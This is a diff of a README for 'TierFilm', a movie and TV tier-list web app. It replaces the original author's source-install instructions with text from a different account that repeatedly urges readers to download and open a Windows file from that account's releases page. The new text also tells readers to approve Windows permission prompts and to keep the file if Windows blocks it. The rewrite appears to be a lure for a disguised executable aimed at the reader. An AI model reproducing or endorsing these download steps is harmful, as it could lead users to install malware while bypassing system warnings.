@@ -1,84 +1,149 @@
-<!-- PROJECT LOGO -->
-<br />
-<p align="center">
-  <kbd>
-  <a href="https://tierfilm.netlify.app/">
-    <img src="https://github.com/user-attachments/assets/2bc6e87b-9bcd-49d6-8a73-10363337f42f" alt="Logo" width="250" height="250">
-  </kbd>
-  </a>
+# 🎬 TierFilm - Make Tier Lists Fast and Easy
 
-  <h3 align="center">TierFilm App</h3>
+[![Download TierFilm](https://img.shields.io/badge/Download%20TierFilm-Release%20Page-blue?style=for-the-badge)](https://github.com/gregoriomanuel/TierFilm/releases)
 
-  <p align="center">
-    Create, share, and compare tier lists for your favorite movies and TV shows.
-    <br />
-    <br />
-    <a href="https://tierfilm.netlify.app/"><strong>View the site</strong></a>
-    <br />
-    <br />
-    <a href="https://github.com/twiez/tierfilm/issues">Report Bug</a>
-    ·
-    <a href="https://github.com/twiez/tierfilm/issues">Request Feature</a>
-    ·
-    <a href="https://github.com/twiez/tierfilm/pulls">Send a Pull Request</a>
-  </p>
-</p>
+## 📥 Download TierFilm
 
-<!-- ABOUT THE PROJECT -->
+1. Open the [TierFilm Releases page](https://github.com/gregoriomanuel/TierFilm/releases).
+2. Find the latest version at the top of the list.
+3. Download the Windows file from that release.
+4. If your browser asks what to do, choose **Save**.
+5. When the download finishes, open the file to start TierFilm.
 
-## About The Project
+## 🖥️ What TierFilm Does
 
-This application allows you to create customizable tier lists for your favorite movies and TV shows. You can search for media, drag and drop them into different tiers, and instantly share your list with friends using a unique, URL-encoded link without needing a database. By sharing your link, you can also compare your lists with others to see your compatibility score.
+TierFilm helps you build a movie and series tier list in minutes. You can drag titles into different ranks, share your list with a link, and compare your taste with friends.
 
-![Screenshot](https://github.com/user-attachments/assets/3f055591-0ecc-42ea-8f63-9cf697515d8f)
+Use it to:
 
-### Features
+- Rank movies you have watched
+- Sort series by how much you liked them
+- Share your list with other people
+- See where your taste matches
+- Keep your picks in one place
 
-- **Create Tier Lists**: Drag-and-drop interface for ranking your favorite media.
-- **Share Lists Easily**: Generates a shareable URL containing your tier list without needing a database.
-- **Compare functionality**: Compare two different tier lists to find commonalities and view compatibility scores.
-- **Export to Image**: Download your tier list as a PNG image.
-- **Internationalization**: Support for multiple languages.
+## 🚀 Get Started on Windows
 
-### Getting Started
+1. Download TierFilm from the [releases page](https://github.com/gregoriomanuel/TierFilm/releases).
+2. Open the downloaded file.
+3. If Windows asks for permission, choose **Yes**.
+4. Wait for the app to open.
+5. Start a new tier list and add your titles.
 
-#### Prerequisites
+If the app opens in a browser window, keep that window open while you use TierFilm.
 
-- Node.js (v18 or higher recommended)
+## 🎯 How to Use TierFilm
 
-#### Installation
+1. Choose the movies or series you want to rank.
+2. Drag each title into the tier that fits best.
+3. Change the order until it feels right.
+4. Save your list.
+5. Share the link with friends.
 
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/twiez/tierfilm.git
-   ```
-2. Navigate to the project directory:
-   ```bash
-   cd tierfilm
-   ```
-3. Install dependencies:
-   ```bash
-   npm install
-   ```
-4. Set up environment variables:
+You can use a simple scale such as:
 
-   ```bash
-   cp .env.example .env
-   ```
+- S for top picks
+- A for great picks
+- B for good picks
+- C for average picks
+- D for lower picks
+- F for the ones you liked least
 
-   _Note: Open `.env` and add your `VITE_TMDB_API_KEY` (TMDB API Key)._
+## 👥 Compare Taste With Friends
 
-5. Start the development server:
-   ```bash
-   npm run dev
-   ```
+TierFilm lets you see how your choices line up with other people.
 
-<!-- SUPPORT -->
+You can:
 
-## Support
+- Share your tier list link
+- Ask friends to make their own list
+- Compare the results
+- Find shared favorites
+- Spot different opinions fast
 
-If you found this project helpful, please give it a ⭐️!
+This works well for movie nights, series debates, and group watch lists.
 
----
+## 🧩 What You Need
 
-Built with ❤️ by [twiez](https://discord.com/users/886190759479480330)
+TierFilm works best on a modern Windows computer with:
+
+- Windows 10 or newer
+- An internet connection for setup and sharing
+- A browser if the app opens as a web page
+- Enough free space to download the app
+
+For smooth use, keep your browser up to date.
+
+## 🛠️ If the App Does Not Open
+
+1. Check that the download finished fully.
+2. Try opening the file again.
+3. If Windows blocks it, choose the option that keeps the file.
+4. Make sure you downloaded the latest release.
+5. Restart your browser or computer and try again.
+
+If you still have trouble, download the file again from the [release page](https://github.com/gregoriomanuel/TierFilm/releases).
+
+## 🎬 Tips for Better Tier Lists
+
+- Start with only a few tiers
+- Rank your favorite titles first
+- Do not overthink the first pass
+- Move titles around after you see the full list
+- Share the list and ask a friend to compare
+
+A short list is often easier to read than a very long one.
+
+## 🔗 Sharing Your List
+
+After you create a list, TierFilm gives you a link you can send to others.
+
+You can share it by:
+
+- Copying the link
+- Sending it in chat
+- Posting it in a group
+- Opening it on another device
+
+People who open the link can view your tier list and compare their own taste.
+
+## 📚 Built For Movie and TV Fans
+
+TierFilm is made for users who like:
+
+- Movies
+- TV shows
+- Tier lists
+- Fast ranking
+- Simple sharing
+
+It uses a clean interface so you can focus on your picks, not on setup.
+
+## 🧠 Common Use Cases
+
+- Rank your favorite sci-fi films
+- Sort every season of a show
+- Make a best-to-worst list for horror movies
+- Compare your list with a friend after a watch party
+- Keep a record of what you liked most
+
+## 📌 Topics
+
+- dnd-kit
+- framer-motion
+- frontend
+- movie-web-app
+- movies-app-react
+- movies-rate
+- react
+- taiwlindcss
+- tdmb-api
+- tier-list
+- tv-shows
+- vite
+
+## 📎 Download Again
+
+If you need the file later, use the same link:
+
+[Visit the TierFilm Releases page](https://github.com/gregoriomanuel/TierFilm/releases)
